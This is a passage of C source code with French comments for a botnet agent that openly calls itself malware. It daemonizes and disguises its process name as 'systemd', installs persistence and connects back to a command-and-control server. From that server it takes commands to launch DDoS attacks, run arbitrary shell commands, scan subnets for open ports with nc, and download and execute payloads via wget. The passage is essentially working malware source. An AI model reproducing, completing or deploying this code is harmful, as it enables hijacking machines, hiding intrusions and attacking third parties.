         send(c2_socket, msg, strlen(msg), 0);
         free(output);
     }
     
     // Scanner quelques ports courants sur les hôtes découverts
     for (int i = 1; i < 255; i++) {
         snprintf(cmd, BUFFER_SIZE, "ping -c 1 -W 1 %s.%d 2>/dev/null | grep 'bytes from'", subnet, i);
         output = execute_command(cmd);
         if (output) {
             free(output);
             
             // Vérifier les ports courants
             int common_ports[] = {22, 23, 80, 443, 8080, 8888, 2222};
             for (int j = 0; j < sizeof(common_ports)/sizeof(int); j++) {
                 snprintf(cmd, BUFFER_SIZE, "nc -z -w1 %s.%d %d 2>/dev/null && echo 'Port %d open'", 
                          subnet, i, common_ports[j], common_ports[j]);
                 output = execute_command(cmd);
                 if (output && strlen(output) > 0) {
                     snprintf(msg, BUFFER_SIZE, "SCAN_RESULT|%s.%d|Port %d open", subnet, i, common_ports[j]);
                     send(c2_socket, msg, strlen(msg), 0);
                     free(output);
                 }
             }
         }
     }
     
     // Informer le serveur C2 que le scan est terminé
     snprintf(msg, BUFFER_SIZE, "SCAN_FINISHED|%s", subnet);
     send(c2_socket, msg, strlen(msg), 0);
 }
 
 // Fonction pour se transformer en démon
 void daemonize() {
     pid_t pid, sid;
     
     // Fork et terminer le processus parent
     pid = fork();
     if (pid < 0) {
         exit(EXIT_FAILURE);
     }
     if (pid > 0) {
         exit(EXIT_SUCCESS); // Terminer le processus parent
     }
     
     // Changer le masque de création de fichier
     umask(0);
     
     // Créer une nouvelle session
     sid = setsid();
     if (sid < 0) {
         exit(EXIT_FAILURE);
     }
     
     // Changer le répertoire de travail
     if (chdir("/") < 0) {
         exit(EXIT_FAILURE);
     }
     
     // Fermer les descripteurs de fichiers standard
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
     
     // Masquer le nom du processus si possible
     #ifdef __linux__
     prctl(PR_SET_NAME, (unsigned long)"systemd", 0, 0, 0);
     #endif
 }
 
 // Fonction pour se connecter au serveur C2
 void connect_to_c2() {
     int sockfd;
     struct sockaddr_in server_addr;
     char buffer[BUFFER_SIZE];
     char* system_info;
 
     // Générer un ID de périphérique s'il n'existe pas déjà
     if (strlen(device_id) == 0) {
         generate_device_id();
     }
 
     while (1) {
         // Créer un socket
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd < 0) {
             sleep(30);
             continue;
         }
 
         // Configurer l'adresse du serveur C2
         memset(&server_addr, 0, sizeof(server_addr));
         server_addr.sin_family = AF_INET;
         server_addr.sin_port = htons(C2_PORT);
 
         // Convertir l'adresse IP en format binaire
         if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
             close(sockfd);
             sleep(30);
             continue;
         }
 
         // Se connecter au serveur C2
         if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
             close(sockfd);
             sleep(30);
             continue;
         }
 
         // Collecter les informations système
         system_info = collect_system_info();
 
         // Envoyer les informations d'identification
         if (system_info) {
             char bot_id[BUFFER_SIZE * 5];
             sprintf(bot_id, "BOT_CONNECTED|%s", system_info);
             send(sockfd, bot_id, strlen(bot_id), 0);
             free(system_info);
         } else {
             send(sockfd, "BOT_CONNECTED|Unknown Device", 28, 0);
         }
 
         // Boucle principale pour recevoir et traiter les commandes
         while (1) {
             memset(buffer, 0, BUFFER_SIZE);
             int n = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
             
             if (n <= 0) {
                 // Connexion perdue, essayer de se reconnecter
                 break;
             }
             
             // Traiter la commande reçue
             if (strncmp(buffer, "PING", 4) == 0) {
                 // Répondre au ping
                 send(sockfd, "PONG", 4, 0);
             } else if (strncmp(buffer, "DDOS", 4) == 0) {
                 // Format: DDOS|target|port|duration|method
                 char target[64], method[32];
                 int port, duration;
                 
                 if (sscanf(buffer, "DDOS|%63[^|]|%d|%d|%31[^\n]", target, &port, &duration, method) == 4) {
                     // Lancer l'attaque DDoS dans un processus fils
                     pid_t pid = fork();
                     if (pid == 0) {
                         ddos_attack(sockfd, target, port, duration, method);
                         exit(0);
                     }
                 }
             } else if (strncmp(buffer, "SHELL", 5) == 0) {
                 // Format: SHELL|command
                 char command[BUFFER_SIZE];
                 char *output;
                 
                 if (sscanf(buffer, "SHELL|%[^\n]", command) == 1) {
                     output = execute_command(command);
                     if (output) {
                         char response[BUFFER_SIZE * 5];
                         snprintf(response, BUFFER_SIZE * 5, "SHELL_RESULT|%s", output);
                         send(sockfd, response, strlen(response), 0);
                         free(output);
                     } else {
                         send(sockfd, "SHELL_RESULT|Command execution failed", 37, 0);
                     }
                 }
             } else if (strncmp(buffer, "UPDATE", 6) == 0) {
                 // Format: UPDATE|url
                 char url[BUFFER_SIZE];
                 
                 if (sscanf(buffer, "UPDATE|%[^\n]", url) == 1) {
                     char cmd[BUFFER_SIZE * 2];
                     snprintf(cmd, BUFFER_SIZE * 2, "wget -q %s -O /tmp/update && chmod +x /tmp/update && /tmp/update", url);
                     system(cmd);
                     
                     // Terminer ce processus après la mise à jour
                     exit(0);
                 }
             } else if (strncmp(buffer, "SCAN", 4) == 0) {
                 // Format: SCAN|subnet
                 char subnet[64];
                 
                 if (sscanf(buffer, "SCAN|%63[^\n]", subnet) == 1) {
                     // Lancer le scan réseau dans un processus fils
                     pid_t pid = fork();
                     if (pid == 0) {
                         scan_network(sockfd, subnet);
                         exit(0);
                     }
                 }
             } else if (strncmp(buffer, "PERSIST", 7) == 0) {
                 // Installer le malware pour qu'il persiste après le redémarrage
                 persist();
                 send(sockfd, "PERSIST_DONE", 12, 0);
             } else if (strncmp(buffer, "KILL", 4) == 0) {
                 // Terminer le bot
                 close(sockfd);
                 exit(0);
             }
         }
         
         // Fermer le socket avant de réessayer
         close(sockfd);
         sleep(10); // Attendre avant de réessayer
     }
 }
 
 // Fonction principale
 int main(int argc, char *argv[]) {
     // Initialiser le générateur de nombres aléatoires
     srand(time(NULL));
     
     // Se transformer en démon
     daemonize();
     
     // Générer un ID de périphérique
     generate_device_id();
     
     // Assurer la persistance
     persist();
     
     // Se connecter au serveur C2
     connect_to_c2();
     
     return 0;
 }
 